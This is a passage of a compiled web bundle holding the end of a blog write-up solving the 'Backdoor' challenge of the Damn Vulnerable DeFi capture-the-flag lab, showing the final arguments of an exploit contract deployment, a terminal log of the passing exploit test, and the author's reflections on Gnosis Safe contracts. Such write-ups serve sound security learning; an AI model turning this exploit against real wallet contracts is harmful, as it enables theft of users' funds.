"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"walletRegistry"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"masterCopy"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"walletFactory"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"this"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"."}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"token"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:".address"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-punctuation)"},children:","})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"        users"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    );"})}),"\n",(0,n.jsx)(e.span,{className:"line",children:(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"});"})})]})}),"\n",(0,n.jsx)(e.p,{children:"And finally..."}),"\n",(0,n.jsx)(e.pre,{"data-language":"bash","data-theme":"default",children:(0,n.jsxs)(e.code,{"data-language":"bash","data-theme":"default",children:[(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"patrickd@damnvulndefi:~/damn-vulnerable-defi$"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"yarn"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"run"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"backdoor"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"yarn"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"run"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"v1.22.17"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"$"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"yarn"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"hardhat"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"test"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"test/backdoor/backdoor.challenge.js"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"$"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"/home/patrickd/damn-vulnerable-defi/node_modules/.bin/hardhat"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"test"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"test/backdoor/backdoor.challenge.js"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"Compiling"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"1"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"file"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"with"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"0.8"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:".7"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"Compilation"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"finished"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"successfully"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"  [Challenge] "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"Backdoor"})]}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"    "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"✓"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"Exploit"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (1581ms)"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:"  "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"1"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"passing"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" (2s)"})]}),"\n",(0,n.jsx)(e.span,{className:"line",children:" "}),"\n",(0,n.jsxs)(e.span,{className:"line",children:[(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-function)"},children:"Done"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"in"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-color-text)"},children:" "}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-constant)"},children:"3.85"}),(0,n.jsx)(e.span,{style:{color:"var(--shiki-token-string)"},children:"s."})]})]})}),"\n",(0,n.jsx)(e.p,{children:"We got it!"}),"\n",(0,n.jsx)(e.hr,{}),"\n",(0,n.jsx)(e.p,{children:"Did this take me way too long to solve? Well, I'm certain that the solution would've been a lot more obvious if I'd had any prior knowledge of the Gnosis contracts. But I just now obtained this knowledge through poking around, the best way to learn new things (in my opinion)!"}),"\n",(0,n.jsx)(e.p,{children:'I think the challenge was a lot of fun. It felt very "real" and, although I can\'t remember one from the top of my head, I imagine something like this must have happened before.'}),"\n",(0,n.jsx)(e.hr,{}),"\n","\n",(0,n.jsxs)(i.oy,{children:[(0,n.jsx)(i.Zb,{icon:(0,n.jsx)(t.aA,{}),title:"← Damn Vulnerable DeFi V2 - #10 Free Rider",href:"/posts/2022/3/2/damn-vulnerable-defi-v2-10-free-rider/"}),(0,n.jsx)(i.Zb,{icon:(0,n.jsx)(t.aA,{}),title:"Damn Vulnerable DeFi V2 - #12 Climber →",href:"/posts/2022/6/29/damn-vulnerable-defi-v2-12-climber/"})]})]})}e.default=(0,o.j)({MDXContent:function(){let s=arguments.length>0&&void 0!==arguments[0]?arguments[0]:{},{wrapper:e}=Object.assign({},(0,r.a)(),s.components);return e?(0,n.jsx)(e,{...s,children:(0,n.jsx)(_createMdxContent,{...s})}):_createMdxContent(s)},pageOpts:{filePath:"pages/posts/2022/6/28/damn-vulnerable-defi-v2-11-backdoor.mdx",route:"/posts/2022/6/28/damn-vulnerable-defi-v2-11-backdoor",timestamp:1702204664e3,title:"Damn Vulnerable DeFi V2 - #11 Backdoor",headings:a},pageNextRoute:"/posts/2022/6/28/damn-vulnerable-defi-v2-11-backdoor"})}},function(s){s.O(0,[3220,1589,9774,2888,179],function(){return s(s.s=10838)}),_N_E=s.O()}]);